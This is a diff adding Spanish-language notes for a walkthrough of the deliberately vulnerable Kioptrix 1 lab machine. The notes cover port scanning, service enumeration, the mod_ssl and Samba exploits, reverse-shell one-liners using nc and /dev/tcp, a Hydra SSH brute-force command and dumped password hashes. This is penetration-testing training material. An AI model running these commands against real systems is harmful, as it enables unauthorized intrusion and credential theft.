@@ -1,0 +1,101 @@
+####################################################################################################################################################################################################################
+1) Enumeration
+
+# netdiscover -i wlan0
+# nmap 192.168.1.0/24
+
+# sudo nmap -p- -sV -sS -T4 -A -oX Kioptrix1.xml 192.168.1.15
+# nmap -sV -T4 -p 1-65535 192.168.1.15
+
+Puerto 22  - TCP - Servicio SSH  - OpenSSH 2.9p2 (protocol 1.99)
+Puerto 80  - TCP - Servicio HTTP - Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+Puerto 111 - TCP - Servicio open  rpcbind     2 (RPC #100000)
+Puerto 139 - TCP - Servicio open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+Puerto 443 - TCP - Servicio SSL/HTTPS - Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+
+OS:
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+2) Lectura de información
+El servicio RPC (Remote Procedure Call) es un porotocolo que permite a un programa de ordenador ejecutar código en la máquina remota sin tener que preocuparse por las comunicaciones entre ambos.
+El comando rpcinfo nos dirá que servicios RPC están funcionando.
+
+En este caso:
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1           1024/tcp  status
+|_  100024  1           1024/udp  status
+
+
+*** Acceso sin usuario a rpcclient
+# rpcclient -U "" 192.168.1.15
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Fuzzing del servidor web
+# dirbuster
+dirb http://192.168.1.15 /usr/share/wordlists/dirb/big.txt
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.15/FUZZ
+
+// NetBios nameserver scanner
+# ntbscan
+
+// Mucha información 
+# enum4linux
+!!!!!
+Samba 2.2.1a
+https://www.cvedetails.com/cve/CVE-2003-0201/
+https://www.exploit-db.com/exploits/10/
+
+// Información del servidor web - vulnerabilidades
+# nikto -host 192.168.1.15 -port 443
+!!!!!
+mod_ssl/2.8.4 - mod_ssl_2.8.7 and lower are vulnerable to remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082
+https://www.exploit-db.com/exploits/764/
+
+###################################################################################################################################################################################################################
+
+2. Explotation
+
+2-1) Mod_ssl
+Descargamos el exploit.
+Aplicamos modificaciones:
+http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
+
+Instalamos:
+libssl-dev
+libssl1.0-dev
+
+Ejecutamos el exploit:
+./OpenFuck 0x6b 192.168.1.15 443 -c 50
+
+
+2-2) Samba
+nc -nlvp 8088
+nc -e /bin/bash 192.168.1.8 8088
+bash -i >& /dev/tcp/192.168.1.11/8088 0>&1
+
+2-2) Samba 2.2.1a
+Descargamos el exploit.
+https://www.exploit-db.com/exploits/10/
+Compilamos
+nc -nlvp 8088
+bash -i >& /dev/tcp/192.168.1.11/8088 0>&1
+
+2-3) SSH
+Bruteforce con Hydra
+hydra -l root -P list.txt 192.168.1.15 ssh
+
+###################################################################################################################################################################################################################
+
+3. Information Gathering
+root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
+john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
+harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
